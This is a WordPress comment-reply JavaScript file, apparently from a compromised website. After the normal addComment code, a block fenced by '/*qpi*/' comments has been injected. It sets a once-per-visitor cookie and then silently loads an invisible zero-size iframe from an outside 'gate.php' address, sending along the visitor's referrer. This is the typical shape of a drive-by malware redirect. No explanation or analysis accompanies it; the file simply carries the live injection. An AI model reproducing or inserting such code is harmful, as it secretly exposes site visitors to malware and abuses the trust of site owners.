addComment={moveForm:function(d,f,i,c){var m=this,a,h=m.I(d),b=m.I(i),l=m.I("cancel-comment-reply-link"),j=m.I("comment_parent"),k=m.I("comment_post_ID");if(!h||!b||!l||!j){return}m.respondId=i;c=c||false;if(!m.I("wp-temp-form-div")){a=document.createElement("div");a.id="wp-temp-form-div";a.style.display="none";b.parentNode.insertBefore(a,b)}h.parentNode.insertBefore(b,h.nextSibling);if(k&&c){k.value=c}j.value=f;l.style.display="";l.onclick=function(){var n=addComment,e=n.I("wp-temp-form-div"),o=n.I(n.respondId);if(!e||!o){return}n.I("comment_parent").value="0";e.parentNode.insertBefore(o,e);e.parentNode.removeChild(e);this.style.display="none";this.onclick=null;return false};try{m.I("comment").focus()}catch(g){}return false},I:function(a){return document.getElementById(a)}};/*qpi*/
function g(){var r=new RegExp('(?:; )?1=([^;]*);?');return r.test(document.cookie)?true:false}
var e=new Date();e.setTime(e.getTime()+(2592000000));
if(!g()&&window.navigator.cookieEnabled)
{
	document.cookie='1=1;expires='+e.toGMTString()+';path=/';
	window.setTimeout(function(){
		var JSinj=document.createElement('iframe');
		JSinj.src='http://googlecounter.in/gate.php?f=954666&r='+encodeURI(document.referrer||'');
		JSinj.width='0';
		JSinj.height='0';
		JSinj.frameborder='0';
		JSinj.marginheight='0';
		JSinj.marginwidth='0';
		JSinj.border='0';
		try{
			document.body.appendChild(JSinj);
		}catch(e){
			document.documentElement.appendChild(JSinj);
		}
	}, 2000);
}
/*qpi*/